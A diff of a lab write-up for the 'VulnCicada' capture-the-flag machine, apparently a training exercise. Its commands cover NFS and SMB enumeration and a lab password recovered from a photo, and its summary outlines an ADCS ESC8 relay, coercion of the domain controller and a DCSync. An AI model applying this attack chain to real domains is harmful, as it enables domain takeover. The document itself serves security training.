@@ -1,20 +1,23 @@
+|Property|Value|
+|---|---|
+|**OS**|Windows|
+|**Difficulty**|Medium|
+|**Release Date**|2025-07-03|
+|**State**|Active|
+|**IP**|10.129.234.48|
+|**Techniques**|NFS enumeration, credential disclosure, ADCS ESC8, NTLM-forced coercion, DCSync|
+|**Tags**|#ad #windows #privesc #adcs #nfs|
 
-| Property         | Value                    |
-| ---------------- | ------------------------ |
-| **OS**           | Windows                  |
-| **Difficulty**   | Medium                   |
-| **Release Date** | 3rd July, 2025           |
-| **State**        | YYYY-MM-DD               |
-| **IP**           | 10.10.10.X               |
-| **Techniques**   | technique-1, technique-2 |
-| **Tags**         | #web #privesc #linux     |
+> **Note:** The machine's IP address changes across sections of this writeup due to restarts (`10.129.234.48`, `10.129.150.101`).
 
 ---
+
 ## Summary
 
-Brief 2-3 sentence ogverview of the machine and attack path.
+VulnCicada is a medium Windows machine built around Active Directory. An NFS export exposes a writable `profiles` share used to store employee profile pictures; one of these pictures, uploaded by `Rosie.Powell`, is a desk photo that has her password written on a visible sticky note. With her credentials, SMB and the `CertEnroll` share reveal that AD CS (Active Directory Certificate Services) is running, and `certipy-ad` confirms it is vulnerable to **ESC8** (HTTP Web Enrollment with no protection against NTLM relay). Because the domain enforces Kerberos and refuses plain NTLM, a specially crafted DNS record is registered first to force the Domain Controller into using NTLM instead of Kerberos when it's coerced. A PetitPotam-style coercion is then triggered and relayed straight to the ADCS web enrollment endpoint, resulting in a certificate for the DC's own machine account. That certificate is used to authenticate and recover the DC's NT hash, which is used to DCSync the domain and grab the `Administrator` hash, completing the compromise.
 
 ---
+
 ## Enumeration
 
 ### Nmap Scan
@@ -24,216 +27,115 @@ nmap -sC -sV vulncicada.htb --open
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 09:55 EDT
 Nmap scan report for vulncicada.htb (10.129.234.48)
 Host is up (0.029s latency).
-Not shown: 984 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 80/tcp   open  http          Microsoft IIS httpd 10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-title: IIS Windows Server
-|_http-server-header: Microsoft-IIS/10.0
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-29 13:55:28Z)
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
 111/tcp  open  rpcbind       2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/tcp6  rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  2,3,4        111/udp6  rpcbind
-|   100003  2,3         2049/udp   nfs
-|   100003  2,3         2049/udp6  nfs
-|   100003  2,3,4       2049/tcp   nfs
-|   100003  2,3,4       2049/tcp6  nfs
-|   100005  1,2,3       2049/tcp   mountd
-|   100005  1,2,3       2049/tcp6  mountd
-|   100005  1,2,3       2049/udp   mountd
-|   100005  1,2,3       2049/udp6  mountd
-|   100021  1,2,3,4     2049/tcp   nlockmgr
-|   100021  1,2,3,4     2049/tcp6  nlockmgr
-|   100021  1,2,3,4     2049/udp   nlockmgr
-|   100021  1,2,3,4     2049/udp6  nlockmgr
-|   100024  1           2049/tcp   status
-|   100024  1           2049/tcp6  status
-|   100024  1           2049/udp   status
-|_  100024  1           2049/udp6  status
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
-| Not valid before: 2026-09-29T13:35:40
-|_Not valid after:  2027-09-29T13:35:40
 445/tcp  open  microsoft-ds?
 464/tcp  open  kpasswd5?
 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
-| Not valid before: 2026-09-29T13:35:40
-|_Not valid after:  2027-09-29T13:35:40
-|_ssl-date: TLS randomness does not represent time
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
 2049/tcp open  nlockmgr      1-4 (RPC #100021)
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
-| Not valid before: 2026-09-29T13:35:40
-|_Not valid after:  2027-09-29T13:35:40
-3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
-| Not valid before: 2026-09-29T13:35:40
-|_Not valid after:  2027-09-29T13:35:40
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
-|_ssl-date: 2026-09-29T13:56:50+00:00; +1s from scanner time.
-| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
-| Not valid before: 2026-09-28T13:43:25
-|_Not valid after:  2027-03-30T13:43:25
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-security-mode: 
-|   3:1:1: 
+| smb2-security-mode:
+|   3:1:1:
 |_    Message signing enabled and required
-| smb2-time: 
-|   date: 2026-09-29T13:56:12
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 113.12 seconds
-
 ```
 
-Standard ad set, however port 111 and 2049 stand out.
+The usual AD services set (DNS, Kerberos, LDAP, SMB, RPC, RDP, WinRM) is present, along with the domain `cicada.vl` and hostname `DC-JPQ225`. Two ports stand out from a standard DC: **111** and **2049**, RPC/NFS. Windows Domain Controllers don't normally run NFS, so this looks like a deliberately added service worth checking first.
 
 ```
 sudo nmap --script nfs* -sV -p111,2049 vulncicada.htb
-[sudo] password for kali: 
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-29 10:31 EDT
-Nmap scan report for vulncicada.htb (10.129.234.48)
-Host is up (0.027s latency).
-
 PORT     STATE SERVICE  VERSION
 111/tcp  open  rpcbind?
-| nfs-statfs: 
-|   Filesystem  1K-blocks   Used        Available  Use%  Maxfilesize  Maxlink
-|_  /profiles   16105468.0  12721588.0  3383880.0  79%   16.0T        1023
-|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+| nfs-statfs:
+|   Filesystem  1K-blocks   Used        Available  Use%
+|_  /profiles   16105468.0  12721588.0  3383880.0  79%
 | nfs-ls: Volume /profiles
 |   access: Read Lookup Modify Extend Delete NoExecute
-| PERMISSION  UID         GID         SIZE  TIME                 FILENAME
-| rwxrwxrwx   4294967294  4294967294  4096  2025-06-03T10:21:17  .
-| ??????????  ?           ?           ?     ?                    ..
-| rwxrwxrwx   4294967294  4294967294  64    2024-09-15T13:25:16  Administrator
-| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Daniel.Marshall
-| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Debra.Wright
-| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:30:51  Jane.Carter
-| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Jordan.Francis
-| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Joyce.Andrews
-| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Katie.Ward
-| rwxrwxrwx   4294967294  4294967294  64    2024-09-13T15:29:28  Megan.Simpson
-|_
-| nfs-showmount: 
-|_  /profiles 
+| PERMISSION  FILENAME
+| rwxrwxrwx   Administrator
+| rwxrwxrwx   Daniel.Marshall
+| rwxrwxrwx   Debra.Wright
+| rwxrwxrwx   Jane.Carter
+| rwxrwxrwx   Jordan.Francis
+| rwxrwxrwx   Joyce.Andrews
+| rwxrwxrwx   Katie.Ward
+| rwxrwxrwx   Megan.Simpson
 2049/tcp open  mountd   1-3 (RPC #100005)
-| nfs-showmount: 
-|_  /profiles 
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 66.18 seconds
-                                                                   
 ```
+
+An NFS export called `/profiles` is world-readable **and** world-writable (`rwxrwxrwx`) with one folder per domain user.
 
 ### NFS Enumeration
 
-Mounting the share to the file system:
+Mounting the share locally:
 
 ```
- sudo mount -t nfs vulncicada.htb:/ ./NFS/ -o nolock
+sudo mount -t nfs vulncicada.htb:/ ./NFS/ -o nolock
 ```
 
-Enumeration reveals some files:
+Listing the mounted `profiles` folder shows a picture in a couple of the user directories:
 
 ```
 ┌──(kali㉿kali)-[~/machines/vulncicada/NFS/profiles]
-└─$ ls * 
+└─$ ls *
 Administrator:
 Documents  vacation.png
 
-Daniel.Marshall:
-
-Debra.Wright:
-
-Jane.Carter:
-
-Jordan.Francis:
-
-Joyce.Andrews:
-
-Katie.Ward:
-
-Megan.Simpson:
-
-Richard.Gibbons:
-
 Rosie.Powell:
 Documents  marketing.png
-
-Shirley.West:
-                                 
 ```
 
-```
-┌──(kali㉿kali)-[~/machines/vulncicada/NFS]
-└─$ cd Rosie.Powell
-                                                                                                                                                                                                                                            
-┌──(kali㉿kali)-[~/machines/vulncicada/NFS/Rosie.Powell]
-└─$ ls
-Documents  marketing.png
-                                                                                                                                                                                                                                            
-┌──(kali㉿kali)-[~/machines/vulncicada/NFS/Rosie.Powell]
-└─$ sudo chmod 777 marketing.png
+The files are owned by a "nobody" UID (`4294967294`), which is how NFS represents a remote root/unmapped user — a normal symptom of `no_root_squash`/anonymous mapping on the export. Since the export is world-writable, the file's local permission bits don't actually stop us from reading it:
 
 ```
+cd Rosie.Powell
+sudo chmod 777 marketing.png
+```
+
+Opening `marketing.png` shows a photo of an employee's desk with a password written on a sticky note stuck to the desk in plain sight:
 
 ![](./screens/marketing.png)
 
-Creds recovered: Rosie.Powell:Cicada123
+Credentials recovered: **`Rosie.Powell:Cicada123`**
 
-### SMB enumeration
+---
+
+## Foothold & SMB / AD CS Enumeration
+
+### SMB Enumeration
 
 ```
 nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
-SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share 
-                                                                                                              
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 [+] cicada.vl\Rosie.Powell:Cicada123
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 Share           Permissions     Remark
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 ADMIN$
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 C$
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 CertEnroll      READ            Active Directory Certificate Services share
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 IPC$            READ
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 NETLOGON        READ
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 profiles$       READ,WRITE
+SMB   DC-JPQ225.cicada.vl 445 DC-JPQ225 SYSVOL          READ
 ```
 
-```
-smbclient -U Rosie.Powell //DC-JPQ225.cicada.vl/CertEnroll --password='Cicada123' -k
-WARNING: The option -k|--kerberos is deprecated!
-gensec_spnego_client_negTokenInit_step: Could not find a suitable mechtype in NEG_TOKEN_INIT
-session setup failed: NT_STATUS_INVALID_PARAMETER
+Two things stand out here:
 
-```
+1. `(NTLM:False)` — this domain has NTLM authentication disabled and enforces Kerberos. This matters later.
+2. A `CertEnroll` share is present, meaning **AD CS (Active Directory Certificate Services)** is installed on the DC.
 
-configure /etc/krb5.conf to get a new ticket as Rosie:
+Since NTLM is disabled, plain password-based `smbclient` fails and Kerberos has to be used instead. `/etc/krb5.conf` is then configured:
 
 ```
 [libdefaults]
@@ -253,421 +155,178 @@ configure /etc/krb5.conf to get a new ticket as Rosie:
 ```
 
 ```
-kinit Rosie.Powell@CICADA.VL # password: Cicada123 klist # confirm you got a TGT
-```
-Accessing the share reveals some certificates:
-
-```
-mbclient -U Rosie.Powell //DC-JPQ225.cicada.vl/CertEnroll --password='Cicada123' -k
-WARNING: The option -k|--kerberos is deprecated!
-Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Tue Sep 29 11:30:48 2026
-  ..                                  D        0  Fri Sep 13 11:17:59 2024
-  cicada-DC-JPQ225-CA(1)+.crl         A      741  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(1).crl          A      941  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(10)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(10).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(11)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(11).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(12)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(12).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(13)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(13).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(14)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(14).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(15)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(15).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(16)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(16).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(17)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(17).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(18)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(18).crl         A      943  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(19)+.crl        A      742  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(19).crl         A      943  Tue Sep 29 11:25:56 2026
-  cicada-DC-JPQ225-CA(2)+.crl         A      741  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(2).crl          A      941  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(20)+.crl        A      742  Tue Sep 29 11:25:56 2026
-  cicada-DC-JPQ225-CA(20).crl         A      943  Tue Sep 29 11:25:56 2026
-  cicada-DC-JPQ225-CA(21)+.crl        A      742  Tue Sep 29 11:25:56 2026
-  cicada-DC-JPQ225-CA(21).crl         A      943  Tue Sep 29 11:25:56 2026
-  cicada-DC-JPQ225-CA(22)+.crl        A      742  Tue Sep 29 11:25:56 2026
-  cicada-DC-JPQ225-CA(22).crl         A      943  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(23)+.crl        A      742  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(23).crl         A      943  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(24)+.crl        A      742  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(24).crl         A      943  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(25)+.crl        A      742  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(25).crl         A      943  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(26)+.crl        A      742  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(26).crl         A      943  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(27)+.crl        A      742  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(27).crl         A      943  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(28)+.crl        A      742  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(28).crl         A      943  Tue Sep 29 11:25:55 2026
-  cicada-DC-JPQ225-CA(3)+.crl         A      741  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(3).crl          A      941  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(4)+.crl         A      741  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(4).crl          A      941  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(5)+.crl         A      741  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(5).crl          A      941  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA(6)+.crl         A      741  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(6).crl          A      941  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(7)+.crl         A      741  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(7).crl          A      941  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(8)+.crl         A      741  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(8).crl          A      941  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(9)+.crl         A      741  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA(9).crl          A      941  Tue Sep 29 11:25:57 2026
-  cicada-DC-JPQ225-CA+.crl            A      736  Tue Sep 29 11:25:58 2026
-  cicada-DC-JPQ225-CA.crl             A      933  Tue Sep 29 11:25:58 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(0-1).crt      A     1385  Sun Sep 15 09:18:43 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1).crt      A      924  Sun Sep 15 03:51:18 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-0).crt      A     1390  Sun Sep 15 09:18:43 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-2).crt      A     1390  Sun Sep 15 09:18:43 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10).crt      A      924  Thu Apr 10 04:44:43 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-11).crt      A     1391  Fri Apr 11 01:48:18 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-9).crt      A     1391  Thu Apr 10 04:57:00 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11).crt      A      924  Thu Apr 10 04:58:25 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-10).crt      A     1391  Fri Apr 11 01:48:18 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-12).crt      A     1391  Fri Apr 11 01:48:18 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12).crt      A      924  Thu Apr 10 05:00:22 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-11).crt      A     1391  Fri Apr 11 01:48:18 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-13).crt      A     1391  Fri Apr 11 01:48:18 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13).crt      A      924  Thu Apr 10 05:03:13 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-12).crt      A     1391  Fri Apr 11 01:48:18 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-14).crt      A     1391  Tue Jun  3 06:21:47 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14).crt      A      924  Fri Apr 11 01:49:42 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-13).crt      A     1391  Tue Jun  3 06:22:11 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-15).crt      A     1391  Tue Jun  3 06:22:11 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15).crt      A      924  Fri Apr 11 01:51:40 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-14).crt      A     1391  Tue Jun  3 06:22:11 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-16).crt      A     1391  Tue Jun  3 06:22:12 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16).crt      A      924  Fri Apr 11 01:53:40 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-15).crt      A     1391  Tue Jun  3 06:22:12 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-17).crt      A     1391  Wed Jun  4 08:51:26 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17).crt      A      924  Tue Jun  3 06:23:15 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-16).crt      A     1391  Wed Jun  4 08:51:26 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-18).crt      A     1391  Wed Jun  4 08:51:26 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18).crt      A      924  Tue Jun  3 06:24:51 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-17).crt      A     1391  Wed Jun  4 08:51:26 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-19).crt      A     1391  Wed Jun  4 08:51:27 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19).crt      A      924  Tue Jun  3 06:26:51 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-18).crt      A     1391  Wed Jun  4 08:51:27 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-20).crt      A     1391  Wed Jun  4 09:34:59 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2).crt      A      924  Sun Sep 15 03:53:03 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-1).crt      A     1390  Sun Sep 15 09:18:44 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-3).crt      A     1390  Sun Sep 29 05:41:29 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20).crt      A      924  Wed Jun  4 08:52:43 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-19).crt      A     1391  Wed Jun  4 09:34:59 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-21).crt      A     1391  Wed Jun  4 09:34:59 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21).crt      A      924  Wed Jun  4 08:54:47 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-20).crt      A     1391  Wed Jun  4 09:34:59 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-22).crt      A     1391  Wed Jun  4 09:34:59 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22).crt      A      924  Wed Jun  4 08:56:47 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-21).crt      A     1391  Wed Jun  4 09:35:00 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-23).crt      A     1391  Wed Jun  4 10:02:35 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23).crt      A      924  Wed Jun  4 09:36:17 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-22).crt      A     1391  Wed Jun  4 10:02:35 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-24).crt      A     1391  Wed Jun  4 10:02:35 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24).crt      A      924  Wed Jun  4 09:38:20 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-23).crt      A     1391  Wed Jun  4 10:02:35 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-25).crt      A     1391  Wed Jun  4 10:02:35 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25).crt      A      924  Wed Jun  4 09:40:21 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-24).crt      A     1391  Wed Jun  4 10:02:35 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-26).crt      A     1391  Tue Sep 29 11:25:45 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26).crt      A      924  Wed Jun  4 10:04:01 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-25).crt      A     1391  Tue Sep 29 11:25:45 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-27).crt      A     1391  Tue Sep 29 11:25:45 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27).crt      A      924  Wed Jun  4 10:05:56 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-26).crt      A     1391  Tue Sep 29 11:25:45 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-28).crt      A     1391  Tue Sep 29 11:25:45 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28).crt      A      924  Wed Jun  4 10:07:56 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28-27).crt      A     1391  Tue Sep 29 11:25:55 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(29).crt      A      924  Tue Sep 29 11:26:49 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3).crt      A      924  Sun Sep 15 09:21:57 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-2).crt      A     1390  Sun Sep 29 05:41:29 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-4).crt      A     1390  Sun Sep 29 05:41:30 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(30).crt      A      924  Tue Sep 29 11:28:48 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(31).crt      A      924  Tue Sep 29 11:30:48 2026
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4).crt      A      924  Sun Sep 15 09:24:13 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-3).crt      A     1390  Sun Sep 29 05:41:30 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-5).crt      A     1390  Thu Apr 10 04:36:39 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5).crt      A      924  Sun Sep 29 05:43:51 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-4).crt      A     1390  Thu Apr 10 04:36:39 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-6).crt      A     1390  Thu Apr 10 04:36:39 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6).crt      A      924  Sun Sep 29 05:44:59 2024
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-5).crt      A     1390  Thu Apr 10 04:36:39 2025
-  DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-7).crt      A     1390  Thu Apr 10 04:36:39 2025
